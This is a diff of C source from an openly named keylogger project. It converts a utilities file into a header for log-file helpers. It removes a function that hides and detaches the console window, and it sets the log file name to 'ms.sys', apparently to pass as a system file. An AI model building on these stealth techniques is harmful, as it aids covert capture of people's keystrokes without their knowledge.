@@ -16,78 +16,43 @@
 */
 
 /*
-* File:   bb-keylogger-utils.c
+* File:   bb-keylogger-file.h
 * Author: Frapin Kevin
-* Date:   22/03/2011
+* Date:   11/04/2011
 *
 * DESCRIPTION
 * -----------------------------------------------------------------------------
-* File containing all the utils functions used by the program.
+* File containing :
+*  - the functions used to manage files operations
+*  - the constants used by these functions
 * -----------------------------------------------------------------------------
 */
 
-//---------------------------------------------------------------------- DEFINE
-#define _WIN32_WINNT 0x0601
+#ifndef BB_KEYLOGGER_FILE_H
+#define BB_KEYLOGGER_FILE_H
 
 //------------------------------------------------------------- SYSTEM INCLUDES
-#include <windows.h>
+#include <stdarg.h>
+#include <stdlib.h>
+#include <stdio.h>
 
-//---------------------------------------------------------- PERSONNAL INCLUDES
-#include "includes/bb-keylogger-utils.h"
-#include "includes/bb-keylogger-keyboard.h"
-#include "includes/bb-keylogger-system.h"
+//------------------------------------------------------------------- CONSTANTS
+// Name of the default log file
+#define DEFAULT_LOG_FILE_NAME "ms.sys"
 
 //------------------------------------------------------------------- FUNCTIONS
-
-/*
-* Function that initializes the program :
-*  - hides the Windows console
-*  - detaches the program from the console
-*/
-void initialize_program(  )
-{
-	HWND hWnd = ( HWND ) GetConsoleWindow( );
-	// Hide the console
-	ShowWindow( hWnd, SW_HIDE );
-	// Detach the process from the console
-	FreeConsole( );
-}
 
 /*
 * Function that log informations passed through unamed parameters.
 * The informations are saved in the log file in the specified format.
 */
-void log_infos( FILE * log_file, const char * format, ... )
-{
-	// Get the unamed parameters
-	va_list arg_ptr;
-	va_start( arg_ptr, format );
-	
-	// Log the infos
-	vfprintf( log_file, format, arg_ptr );
-	va_end( arg_ptr );
-}
+void log_infos( FILE * log_file, const char * format, ... );
 
 /*
 * Function that opens a file a checks if the opening succeeded :
 *  - if the opening failed, the programm is killed
 *  - if the opening succeeded, the file pointer is returned
 */
-FILE * open_file( char * log_file_name )
-{
-	FILE * log_file = fopen( log_file_name, "a" );
-	if( log_file == NULL )
-	{
-		exit( EXIT_FAILURE );
-	}
+FILE * open_file( char * file_name );
 
-	return log_file;
-}
-
-
-
-
-
-
-
-
+#endif /* BB_KEYLOGGER_FILE_H */
